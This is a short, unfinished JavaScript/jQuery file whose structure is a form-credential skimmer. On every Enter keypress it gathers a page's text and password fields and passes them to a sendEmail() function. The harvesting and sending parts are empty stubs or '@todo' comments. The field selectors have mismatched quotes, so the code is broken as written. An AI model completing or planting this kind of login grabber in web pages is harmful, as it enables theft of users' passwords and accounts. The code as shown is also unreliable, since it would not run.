function getLoginAndPassword() {
  // add all text fields
  var logins = $("input[type="text"]");
  var passwords = $("input[type="password"]");
  var data = "";
  if (Array.isArray(logins)) {
    // @todo get values
  } else {
    // @todo get value
  }
  if (Array.isArray(passwords)) {

  } else {

  }
  return data;
}

function sendEmail() {

}

$(document).keypress(function(e) {
    if(e.which == 13) {
      var data = getLoginAndPassword();
      sendEmail();
    }
});

$("input[type='text']").on("click", function () {
  
});
